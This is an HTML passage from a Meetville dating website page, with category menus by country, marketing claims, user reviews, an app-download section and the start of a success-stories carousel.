<div class="seo-menu-desktop-slidable-title">in Australia</div>
<ul class="seo-menu-desktop-slidable-ul">
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/1427-over-50-s.html" class="seo-menu-drop-down-title">Over
50</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/677-christian.html" class="seo-menu-drop-down-title">Christian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/1429-senior.html" class="seo-menu-drop-down-title">Senior</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/5363-chinese.html" class="seo-menu-drop-down-title">Chinese</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/1283-mature.html" class="seo-menu-drop-down-title">Mature</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/379-indian.html" class="seo-menu-drop-down-title">Indian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/377-black.html" class="seo-menu-drop-down-title">Black</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/381-asian.html" class="seo-menu-drop-down-title">Asian</a>
</li>
</ul>
</li>
<li class="seo-menu-desktop-slidable">
<div class="seo-menu-desktop-slidable-title">in United Kingdom</div>
<ul class="seo-menu-desktop-slidable-ul">
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/677-christian.html" class="seo-menu-drop-down-title">Christian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/377-black.html" class="seo-menu-drop-down-title">Black</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/1429-senior.html" class="seo-menu-drop-down-title">Senior</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/684-spiritual-but-not-religious.html" class="seo-menu-drop-down-title">Spiritual</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/1283-mature.html" class="seo-menu-drop-down-title">Mature</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/381-asian.html" class="seo-menu-drop-down-title">Asian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/379-indian.html" class="seo-menu-drop-down-title">Indian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/1428-over-60-s.html" class="seo-menu-drop-down-title">Over
60's</a>
</li>
</ul>
</li>
</ul>
</div>
</li>
<li class="seo-menu-desktop-section">
<div class="seo-menu-desktop-section-title"><span>Single Women</span></div>
<div class="seo-menu-desktop-drop-down">
<ul class="seo-menu-desktop-drop-down-list">
<li class="seo-menu-desktop-slidable is-opened">
<div class="seo-menu-desktop-slidable-title">in United States</div>
<ul class="seo-menu-desktop-slidable-ul" style="display: block">
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/496-old/woman.html" class="seo-menu-drop-down-title">Old</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/4090-black-bbw.html" class="seo-menu-drop-down-title">Black
BBW</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/381-asian/woman.html" class="seo-menu-drop-down-title">Asian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/1244-asian-mature/woman.html" class="seo-menu-drop-down-title">Asian
Mature</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/4099-mature-bbw.html" class="seo-menu-drop-down-title">Mature
BBW</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/1452-bbw.html" class="seo-menu-drop-down-title">BBW</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/5563-mexican-bbw.html" class="seo-menu-drop-down-title">Mexican
BBW</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/1430-milfs.html" class="seo-menu-drop-down-title">Milfs</a>
</li>
</ul>
</li>
<li class="seo-menu-desktop-slidable">
<div class="seo-menu-desktop-slidable-title">in Canada</div>
<ul class="seo-menu-desktop-slidable-ul">
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/ca/page/496-old/woman.html" class="seo-menu-drop-down-title">Old</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/ca/page/659-rich/woman.html" class="seo-menu-drop-down-title">Rich</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/ca/page/381-asian/woman.html" class="seo-menu-drop-down-title">Asian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/ca/page/379-indian/woman.html" class="seo-menu-drop-down-title">Indian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/ca/page/1431-cougar.html" class="seo-menu-drop-down-title">Cougar</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/ca/page/377-black/woman.html" class="seo-menu-drop-down-title">Black</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/ca/page/1452-bbw.html" class="seo-menu-drop-down-title">BBW</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/ca/page/1283-mature/woman.html" class="seo-menu-drop-down-title">Mature</a>
</li>
</ul>
</li>
<li class="seo-menu-desktop-slidable">
<div class="seo-menu-desktop-slidable-title">in Australia</div>
<ul class="seo-menu-desktop-slidable-ul">
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/496-old/woman.html" class="seo-menu-drop-down-title">Old</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/381-asian/woman.html" class="seo-menu-drop-down-title">Asian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/377-black/woman.html" class="seo-menu-drop-down-title">Black</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/379-indian/woman.html" class="seo-menu-drop-down-title">Indian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/1452-bbw.html" class="seo-menu-drop-down-title">BBW</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/1431-cougar.html" class="seo-menu-drop-down-title">Cougar</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/1283-mature/woman.html" class="seo-menu-drop-down-title">Mature</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/au/page/659-rich/woman.html" class="seo-menu-drop-down-title">Rich</a>
</li>
</ul>
</li>
<li class="seo-menu-desktop-slidable">
<div class="seo-menu-desktop-slidable-title">United Kingdom</div>
<ul class="seo-menu-desktop-slidable-ul">
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/1431-cougar.html" class="seo-menu-drop-down-title">Cougar</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/1452-bbw.html" class="seo-menu-drop-down-title">BBW</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/496-old/woman.html" class="seo-menu-drop-down-title">Old</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/377-black/woman.html" class="seo-menu-drop-down-title">Black</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/381-asian/woman.html" class="seo-menu-drop-down-title">Asian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/1283-mature/woman.html" class="seo-menu-drop-down-title">Mature</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/4191-married/woman.html" class="seo-menu-drop-down-title">Married</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/gb/page/379-indian/woman.html" class="seo-menu-drop-down-title">Indian</a>
</li>
</ul>
</li>
</ul>
</div>
</li>
<li class="seo-menu-desktop-section">
<div class="seo-menu-desktop-section-title"><span>LGBT Dating</span></div>
<div class="seo-menu-desktop-drop-down">
<ul class="seo-menu-desktop-drop-down-list">
<li class="seo-menu-desktop-slidable is-opened">
<div class="seo-menu-desktop-slidable-title">in United States</div>
<ul class="seo-menu-desktop-slidable-ul" style="display: block">
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/5333-gay-chat-room.html" class="seo-menu-drop-down-title">Gay
Chat Room</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/5338-lesbian-chat-room.html" class="seo-menu-drop-down-title">Lesbian
Chat Room</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/1455-lesbian.html" class="seo-menu-drop-down-title">Lesbian
Dating</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/4444-teen-lesbian.html" class="seo-menu-drop-down-title">Teen
Lesbian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/5623-mature-lesbian.html" class="seo-menu-drop-down-title">Mature
Lesbian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/4439-bbw-lesbian.html" class="seo-menu-drop-down-title">BBW
Lesbian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/4231-asian-lesbian.html" class="seo-menu-drop-down-title">Asian
Lesbian</a>
</li>
<li class="seo-menu-desktop-drop-down-item">
<a href="catalog/us/page/4414-lesbian-latina.html" class="seo-menu-drop-down-title">Latina
Lesbian</a>
</li>
</ul>
</li>
</ul>
</div>
</li>
</ul>
</div>
<a href="https://m.meetville.com/?utm_source=catalog&amp;utm_medium=catalog&amp;utm_campaign=header-cta" class="seo-menu-desktop-link">View Singles for Free</a>
<a href="https://m.meetville.com/login?utm_source=catalog&amp;utm_medium=catalog&amp;utm_campaign=header-sign-in" class="seo-menu-desktop-link-login">Sign In</a>
</div>
</div>
</div>
<section class="advantages wrapper">
<div class="container">
<div class="advantage">
<img src="https://drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/advantage1.5c4503f47c1d643706f645ee7e969f8d.svg" alt="The trusted dating site">
<div class="heading">The trusted dating site</div>
<p>We moderate every single profile on our site, and your personal data is always protected</p>
</div>
<div class="advantage">
<img src="https://drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/advantage2.1990cf9a1d69f0fbaef726de7c510311.svg" alt="Safe and Secure">
<div class="heading">Safe and Secure</div><p>We do our best to be safe to use to our members and have a scammer tracking system.</p></div>
<div class="advantage">
<img src="https://drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/advantage3.3d95d5e03363715f2e33ae9d01c48152.svg" alt="Highest quality dating pool">
<div class="heading">Highest quality dating pool</div><p>A perfect dating platform helping you connect, communicate, and meet your soulmate.</p>
</div>
</div>
</section>
<div class="container">
<div class="row">
<div class="countries">
<div class="countries-header">
<h3 class="font-roboto-500 color-black countries-header__title">countries</h3>
</div>
<div class="countries-body">
<ul class="countries-body__list" id="js-countries-list">
<li class="countries-body__item">
<a href="catalog/us71dc.html?utm_source=landing" title="United States" data-short="us" target="_self" class="font-roboto-400 countries-body__link">United States</a>
</li>
<li class="countries-body__item">
<a href="catalog/in71dc.html?utm_source=landing" title="India" data-short="in" target="_self" class="font-roboto-400 countries-body__link">India</a>
</li>
<li class="countries-body__item">
<a href="catalog/my71dc.html?utm_source=landing" title="Malaysia" data-short="my" target="_self" class="font-roboto-400 countries-body__link">Malaysia</a>
</li>
<li class="countries-body__item">
<a href="catalog/ca71dc.html?utm_source=landing" title="Canada" data-short="ca" target="_self" class="font-roboto-400 countries-body__link">Canada</a>
</li>
<li class="countries-body__item">
<a href="catalog/au71dc.html?utm_source=landing" title="Australia" data-short="au" target="_self" class="font-roboto-400 countries-body__link">Australia</a>
</li>
<li class="countries-body__item">
<a href="catalog/gb71dc.html?utm_source=landing" title="United Kingdom" data-short="gb" target="_self" class="font-roboto-400 countries-body__link">United Kingdom</a>
</li>
<li class="countries-body__item">
<a href="catalog/id71dc.html?utm_source=landing" title="Indonesia" data-short="id" target="_self" class="font-roboto-400 countries-body__link">Indonesia</a>
</li>
<li class="countries-body__item">
<a href="catalog/ae71dc.html?utm_source=landing" title="United Arab Emirates" data-short="ae" target="_self" class="font-roboto-400 countries-body__link">United Arab Emirates</a>
</li>
<li class="countries-body__item">
<a href="catalog/mu71dc.html?utm_source=landing" title="Mauritius" data-short="mu" target="_self" class="font-roboto-400 countries-body__link">Mauritius</a>
</li>
<li class="countries-body__item">
<a href="catalog/sa71dc.html?utm_source=landing" title="Saudi Arabia" data-short="sa" target="_self" class="font-roboto-400 countries-body__link">Saudi Arabia</a>
</li>
<li class="countries-body__item">
<a href="catalog/qa71dc.html?utm_source=landing" title="Qatar" data-short="qa" target="_self" class="font-roboto-400 countries-body__link">Qatar</a>
</li>
<li class="countries-body__item">
<a href="catalog/nz71dc.html?utm_source=landing" title="New Zealand" data-short="nz" target="_self" class="font-roboto-400 countries-body__link">New Zealand</a>
</li>
<li class="countries-body__item">
<a href="catalog/de71dc.html?utm_source=landing" title="Germany" data-short="de" target="_self" class="font-roboto-400 countries-body__link">Germany</a>
</li>
<li class="countries-body__item">
<a href="catalog/fr71dc.html?utm_source=landing" title="France" data-short="fr" target="_self" class="font-roboto-400 countries-body__link">France</a>
</li>
<li class="countries-body__item">
<a href="catalog/es71dc.html?utm_source=landing" title="Spain" data-short="es" target="_self" class="font-roboto-400 countries-body__link">Spain</a>
</li>
</ul>
</div>
<div class="countries-footer">
<button type="button" title="More" class="countries-footer__btn" id="js-countries-btn">More</button>
</div>
</div>
</div>
</div>
<div class="container bg-white slider-block">
<input type="radio" name="slider-block" checked="checked" id="slider-block-1" />
<input type="radio" name="slider-block" id="slider-block-2" />
<input type="radio" name="slider-block" id="slider-block-3" />
<input type="radio" name="slider-block" id="slider-block-4" />
<div class="owl-dots owl-dots-no-js">
<label for="slider-block-1">1</label>
<label for="slider-block-2">2</label>
<label for="slider-block-3">3</label>
<label for="slider-block-4">4</label>
</div>
<ul id="js-slider-block-list" class="owl-carousel owl-theme slider-block__list slide-1-mounted" role="none">
<li class="slider-block__item slider-block__item--first">
<div class="photo-container">
<picture class="photo">
<source media="(min-width: 900px) " srcset="/seoassets/30.06.2020/images/webp/slider-02-01-medium.webp" data-src="/seoassets/30.06.2020/images/webp/slider-02-01-medium.webp" data-load-priority="1" type="image/webp">
<source srcset="/seoassets/30.06.2020/images/webp/slider-02-01-small.webp" data-src="/seoassets/30.06.2020/images/webp/slider-02-01-small.webp" data-load-priority="1" type="image/webp">
<source media="(min-width: 900px)" srcset="/seoassets/30.06.2020/images/jpg/slider-02-01-medium.jpg" data-src="/seoassets/30.06.2020/images/jpg/slider-02-01-medium.jpg" data-load-priority="1" type="image/jpeg">
<source srcset="/seoassets/30.06.2020/images/jpg/slider-02-01-small.jpg" data-src="/seoassets/30.06.2020/images/jpg/slider-02-01-small.jpg" data-load-priority="1" type="image/jpeg">
<img src="seoassets/30.06.2020/images/jpg/slider-02-01-medium.jpg" loading="lazy" data-src="/seoassets/30.06.2020/images/jpg/slider-02-01-medium.jpg" data-load-priority="1" alt>
</picture>
<div class="photo-description-container">
<h3>Find a person <br> you like</h3>
<p>Take a look at high-quality photos and full profiles of our users.</p>
</div>
</div>
</li>
<li class="slider-block__item slider-block__item--second">
<div class="photo-container">
<picture class="photo">
<source media="(min-width: 900px) " srcset="/seoassets/30.06.2020/images/webp/slider-02-02-medium.webp" data-src="/seoassets/30.06.2020/images/webp/slider-02-02-medium.webp" data-load-priority="1" type="image/webp">
<source srcset="/seoassets/30.06.2020/images/webp/slider-02-02-small.webp" data-src="/seoassets/30.06.2020/images/webp/slider-02-02-small.webp" data-load-priority="1" type="image/webp">
<source media="(min-width: 900px) " srcset="/seoassets/30.06.2020/images/jpg/slider-02-02-medium.jpg" data-src="/seoassets/30.06.2020/images/jpg/slider-02-02-medium.jpg" data-load-priority="1" type="image/jpeg">
<source srcset="/seoassets/30.06.2020/images/jpg/slider-02-02-small.jpg" data-src="/seoassets/30.06.2020/images/jpg/slider-02-02-small.jpg" data-load-priority="1" type="image/jpeg">
<img src="seoassets/30.06.2020/images/jpg/slider-02-02-medium.jpg" loading="lazy" data-src="/seoassets/30.06.2020/images/jpg/slider-02-02-medium.jpg" data-load-priority="2" alt>
</picture>
<div class="photo-description-container">
<h3>Artificial Intelligence <br> will find the best match</h3>
<p>We use machine learning to find your perfect match by common interests, values, and psychological
compatibility.</p>
</div>
</div>
</li>
<li class="slider-block__item slider-block__item--third">
<div class="photo-container">
<picture class="photo">
<source media="(min-width: 900px) " srcset="/seoassets/30.06.2020/images/webp/slider-02-03-medium.webp" data-src="/seoassets/30.06.2020/images/webp/slider-02-03-medium.webp" data-load-priority="1" type="image/webp">
<source srcset="/seoassets/30.06.2020/images/webp/slider-02-03-small.webp" data-src="/seoassets/30.06.2020/images/webp/slider-02-03-small.webp" data-load-priority="1" type="image/webp">
<source media="(min-width: 900px) " srcset="/seoassets/30.06.2020/images/jpg/slider-02-03-medium.jpg" data-src="/seoassets/30.06.2020/images/jpg/slider-02-03-medium.jpg" data-load-priority="1" type="image/jpeg">
<source srcset="/seoassets/30.06.2020/images/jpg/slider-02-03-small.jpg" data-src="/seoassets/30.06.2020/images/jpg/slider-02-03-small.jpg" data-load-priority="1" type="image/jpeg">
<img src="seoassets/30.06.2020/images/jpg/slider-02-03-medium.jpg" loading="lazy" data-src="/seoassets/30.06.2020/images/jpg/slider-02-03-medium.jpg" data-load-priority="3" alt>
</picture>
<div class="photo-description-container">
<h3>Get acquainted <br> with verified people</h3>
<p>Our users are verified, which helps to avoid the possibility of chatting with scammers.</p>
</div>
</div>
</li>
<li class="slider-block__item slider-block__item--fourth">
<div class="photo-container">
<picture class="photo">
<source media="(min-width: 900px) " srcset="/seoassets/30.06.2020/images/webp/slider-02-04-medium.webp" data-src="/seoassets/30.06.2020/images/webp/slider-02-04-medium.webp" data-load-priority="1" type="image/webp">
<source srcset="/seoassets/30.06.2020/images/webp/slider-02-04-small.webp" data-src="/seoassets/30.06.2020/images/webp/slider-02-04-small.webp" data-load-priority="1" type="image/webp">
<source media="(min-width: 900px) " srcset="/seoassets/30.06.2020/images/jpg/slider-02-04-medium.jpg" data-src="/seoassets/30.06.2020/images/jpg/slider-02-04-medium.jpg" data-load-priority="1" type="image/jpeg">
<source srcset="/seoassets/30.06.2020/images/jpg/slider-02-04-small.jpg" data-src="/seoassets/30.06.2020/images/jpg/slider-02-04-small.jpg" data-load-priority="1" type="image/jpeg">
<img src="seoassets/30.06.2020/images/jpg/slider-02-04-medium.jpg" loading="lazy" data-src="/seoassets/30.06.2020/images/jpg/slider-02-04-medium.jpg" data-load-priority="4" alt>
</picture>
<div class="photo-description-container">
<h3>communicate <br> at a new level</h3>
<p>Get the attention of your match with a wink, like or gift!</p>
</div>
</div>
</li>
</ul>
</div>
<div class="bg-gray-100">
<section class="users_reviews">
<div class="reviews-header">
<div class="row">
<h2 class="reviews-header__title">Users Reviews</h2>
</div>
</div>
<div class="reviews_slider_wrapper">
<div class="trust_pilot_widget">
<div class="trust_pilot_widget_title">Great</div>
<div class="trust_pilot_widget_stars">
<img src="seoassets/30.06.2020/images/svg/stars-4.svg" loading="lazy" data-src="/seoassets/30.06.2020/images/svg/stars-4.svg" alt="stars">
</div>
<div class="trust_pilot_desktop_rate">
Based on <b>377 reviews</b>
</div>
<div class="trust_pilot_mobile_rate">
<span>Rated <b>4.1</b> / 5</span>
<svg width="4px" height="4px" viewBox="0 0 4 4" version="1.1" xmlns="http://www.w3.org/2000/svg">
<g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
<g id="SEO-Catalog-Update-(Tablet-768-#01)" transform="translate(-385.000000, -439.000000)">
<rect id="background" fill="#FFFFFF" x="0" y="-3953" width="768" height="9358"></rect>
<g id="Group-3" transform="translate(10.000000, 22.000000)">
<rect id="Rectangle" fill="#F5F7FA" x="0" y="58" width="768" height="450"></rect>
<g transform="translate(285.000000, 409.000000)" fill="#454554" id="Group-8">
<g id="Group-2" transform="translate(-0.000000, 0.000000)">
<circle id="Oval" cx="92" cy="10" r="2"></circle>
</g>
</g>
</g>
</g>
</g>
</svg>
<b>267 reviews</b>
</div>
<div class="trust_pilot_widget_logo">
<img src="seoassets/30.06.2020/images/svg/logo-black.svg" loading="lazy" data-src="/seoassets/30.06.2020/images/svg/logo-black.svg" alt="logo">
</div>
</div>
<div class="owl-carousel reviews_slider" id="js_reviews_slider">
<div class="reviews_slider_item">
<div class="reviews_slider_item_header">
<picture class="reviews_slider_item_img">
<source srcset="/seoassets/30.06.2020/images/png/rev1-medium.png" data-src="/seoassets/30.06.2020/images/png/rev1-medium.png" type="image/png">
<img src="seoassets/30.06.2020/images/png/rev1-medium.png" loading="lazy" alt="Josiah Kabbes" data-src="seoassets/30.06.2020/images/png/rev1-medium.png">
</picture>
<img src="seoassets/30.06.2020/images/svg/stars-5.svg" loading="lazy" data-src="/seoassets/30.06.2020/images/svg/stars-5.svg" alt="stars">
<span>5.0</span>
</div>
<div class="reviews_slider_item_title">Josiah Kabbes</div>
<div class="reviews_slider_item_text">So far I think Meetville is great! I got plenty of likes and women interested in me in less then like 30 minutes. That has happened hardly never on other dating web sights for me.</div>
</div>
<div class="reviews_slider_item">
<div class="reviews_slider_item_header">
<picture class="reviews_slider_item_img">
<source srcset="/seoassets/30.06.2020/images/png/rev2-medium.png" data-src="/seoassets/30.06.2020/images/png/rev2-medium.png" type="image/png">
<img src="seoassets/30.06.2020/images/png/rev2-medium.png" loading="lazy" alt="Jack" data-src="seoassets/30.06.2020/images/png/rev2-medium.png">
</picture>
<img src="seoassets/30.06.2020/images/svg/stars-5.svg" loading="lazy" data-src="/seoassets/30.06.2020/images/svg/stars-5.svg" alt="stars">
<span>5.0</span>
</div>
<div class="reviews_slider_item_title">Jack</div>
<div class="reviews_slider_item_text">Easy to use and this site is safe.</div>
</div>
<div class="reviews_slider_item">
<div class="reviews_slider_item_header">
<picture class="reviews_slider_item_img">
<source srcset="/seoassets/30.06.2020/images/png/rev3-medium.png" data-src="/seoassets/30.06.2020/images/png/rev3-medium.png" type="image/png">
<img src="seoassets/30.06.2020/images/png/rev3-medium.png" loading="lazy" alt="Fio Alvarez" data-src="seoassets/30.06.2020/images/png/rev3-medium.png">
</picture>
<img src="seoassets/30.06.2020/images/svg/stars-4.svg" loading="lazy" data-src="/seoassets/30.06.2020/images/svg/stars-4.svg" alt="stars">
<span>4.0</span>
</div>
<div class="reviews_slider_item_title">Fio Alvarez</div>
<div class="reviews_slider_item_text">Good I like the people here</div>
</div>
<div class="reviews_slider_item">
<div class="reviews_slider_item_header">
<picture class="reviews_slider_item_img">
<source srcset="/seoassets/30.06.2020/images/png/rev4-medium.png" data-src="/seoassets/30.06.2020/images/png/rev4-medium.png" type="image/png">
<img src="seoassets/30.06.2020/images/png/rev4-medium.png" loading="lazy" alt="Rob Ecklund" data-src="seoassets/30.06.2020/images/png/rev4-medium.png">
</picture>
<img src="seoassets/30.06.2020/images/svg/stars-5.svg" loading="lazy" data-src="/seoassets/30.06.2020/images/svg/stars-5.svg" alt="stars">
<span>5.0</span>
</div>
<div class="reviews_slider_item_title">Rob Ecklund</div>
<div class="reviews_slider_item_text">Right away I had responses beautiful women close by</div>
</div>
<div class="reviews_slider_item">
<div class="reviews_slider_item_header">
<picture class="reviews_slider_item_img">
<source srcset="/seoassets/30.06.2020/images/png/rev5-medium.png" data-src="/seoassets/30.06.2020/images/png/rev5-medium.png" type="image/png">
<img src="seoassets/30.06.2020/images/png/rev5-medium.png" loading="lazy" alt="Jesus Olivera" data-src="seoassets/30.06.2020/images/png/rev5-medium.png">
</picture>
<img src="seoassets/30.06.2020/images/svg/stars-5.svg" loading="lazy" data-src="/seoassets/30.06.2020/images/svg/stars-5.svg" alt="stars">
<span>5.0</span>
</div>
<div class="reviews_slider_item_title">Jesus Olivera</div>
<div class="reviews_slider_item_text">Really good thank you</div>
</div>
<div class="reviews_slider_item">
<div class="reviews_slider_item_header">
<picture class="reviews_slider_item_img">
<source srcset="/seoassets/30.06.2020/images/png/rev7-medium.png" data-src="/seoassets/30.06.2020/images/png/rev7-medium.png" type="image/png">
<img src="seoassets/30.06.2020/images/png/rev7-medium.png" loading="lazy" alt="Jeff" data-src="seoassets/30.06.2020/images/png/rev7-medium.png">
</picture>
<img src="seoassets/30.06.2020/images/svg/stars-5.svg" loading="lazy" data-src="/seoassets/30.06.2020/images/svg/stars-5.svg" alt="stars">
<span>5.0</span>
</div>
<div class="reviews_slider_item_title">Jeff</div>
<div class="reviews_slider_item_text">Really good thank you</div>
</div>
</div>
</div>
</section>
</div>
<section class="get_meetville wrapper">
<h2 class="heading">Get The Meetville App On Your Phone</h2>
<div class="phone_control page1_phone_wrapper">
<div class="page1_phone_inner">
<div class="phone_code_control page1_phone_code">
<div class="phone_code_data_control" data-code="52" data-country-code="MX">+52</div>
<div class="arrow_down" style="background: url('https://drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/icon-arrow.a856fb2f90314964e28a0f1d487c17db.svg');"></div>
</div>
<input class="phone_number_input_control page1_phone_number" placeholder="Phone Number">
<button class="page1_send_sms send_sms_control">Send Link</button>
</div>
<div class="page1_phone_invalid_message">It doesn't look like a phone number</div></div><div class="qr_code_link">or&nbsp;&nbsp;&nbsp;&nbsp;<a class="get_qr_control" href="javascript:void(0)">get QR-code</a></div>
</section>
<div class="popup_wrapper sent_sms_popup_control">
<div class="sent_sms_popup">
<div class="heading with_left_border">We have sent you a message!</div>
<div class="close_icon sent_sms_popup_close_icon"></div>
<div class="sent_sms_popup_message">
<div>
<span>We have sent SMS with the link to your number</span>
<span class="sent_sms_popup_message_phone_number">+375 29 865-93-42.</span>
</div>
<div>Start using Meetville app right now!</div>
</div>
</div>
</div>
<div class="popup_wrapper qr_code_popup_control">
<div class="qr_code_popup_inner">
<div class="close_icon qr_code_close_popup"></div>
<div class="qr_code_icon" style="background-image: url(%27https_/drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/qrcode.64bec86ec4c53c79343fddff7aa87488.html);"></div>
<div class="qr_code_message_container">
<div class="heading with_left_border">
Scan QR code <br>to get Meetville on your phone
</div>
<div class="message_list">
<p class="message_list_item">
<span class="list_item_id">1.</span>
<span>Open the QR Code scanner on your phone.</span>
</p>
<p class="message_list_item">
<span class="list_item_id">2.</span>
<span>Hold your device over a QR Code so that it’s<br> clearly visible within your smartphone’s screen.</span>
</p>
<p class="message_list_item">
<span class="list_item_id">3.</span>
<span>If the phone doesn't automatically scan the<br> code - press a button on your device to scan<br> the code manually.</span>
</p>
</div>
</div>
</div>
</div>
<section class="get_app wrapper">
<h2 class="heading">Meetville Dating App</h2><p>Use Meetville on your phone with our app.<br>Over 22,000 5-Star <a href="catalog/online-app-review.html">Reviews</a></p><img class="stars" src="https://drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/stars_icon.55bedbb80214a9a1e0bb703492a967f6.svg" alt="Use Meetville on your phone with our app"> <a href="https://meetville.onelink.me/pOqk?pid=catalog&amp;af_channel=catalog"><img class="google_play_icon download-block__img" src="../drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/google-play-badge-en.2147b0f4691cca471c30d49f3bd91c2e.png" alt="Get the app on Google Play" id="button_google_play_lp"><amp-img class="google_play_icon download-block__img" src="https://drz2u6kbopobk.cloudfront.net/mtvl_webapp/images/google-play-badge-en.e43c8c69a6a6ec6db728cc41c055cbc9.webp" alt="Get the app on Google Play" id="button_google_play_lp"></amp-img></a>
</section>
<div class="container bg-blue-100 success-stories">
<div class="row">
<div class="success-stories-description">
<p class="success-stories-description__title">Success Stories</p>
<span class="success-stories-description__text"> These people have already matched. <br> <strong>Now it’s your turn!</strong> </span>
</div>
</div>
<input type="radio" name="success-stories" checked="checked" id="success-stories-1" />
<input type="radio" name="success-stories" id="success-stories-2" />
<input type="radio" name="success-stories" id="success-stories-3" />
<input type="radio" name="success-stories" id="success-stories-4" />
<input type="radio" name="success-stories" id="success-stories-5" />
<div class="owl-dots owl-dots-no-js">
<label for="success-stories-1">1</label>
<label for="success-stories-2">2</label>
<label for="success-stories-3">3</label>
<label for="success-stories-4">4</label>
<label for="success-stories-5">5</label>
</div>
<ul id="js-success-stories-list" class="owl-carousel owl-theme success-stories-list" role="presentation">
<li class="success-stories-list__item" role="none">
<a href="blog/couples/story-ellie-brad.html" target="_blank" title="Meetville Couples: The Story of Ellie and Brad">
<div class="success-stories-section">
<picture class="success-stories-section__photo">
<source media="(min-resolution: 100dpi) " srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/Depositphotos_47351945_m-2015_00000-min.png" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/Depositphotos_47351945_m-2015_00000-min.png" data-load-priority="2" type="image/jpeg">
<source srcset="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/Depositphotos_47351945_m-2015_00000-min.png" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/Depositphotos_47351945_m-2015_00000-min.png" data-load-priority="2" type="image/jpeg">
<img src="../mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/Depositphotos_47351945_m-2015_00000-min.png" loading="lazy" data-src="https://mtvl-seo-img.s3.amazonaws.com/blog-images/2018/01/Depositphotos_47351945_m-2015_00000-min.png" data-load-priority="2" alt="Meetville Couples: The Story of Ellie and Brad">
</picture>
<div class="success-stories-section__container">
<p class="success-stories-section__title">Meetville Couples: The Story of Ellie and Brad</p>
<p class="success-stories-section__text"></p>
</div>
</div>
</a>
</li>
<li class="success-stories-list__item" role="none">
<a href="blog/couples/meetville-couples-story-sofia-william.html" target="_blank" title="Meetville Couples: The Story of Sofia and Will">
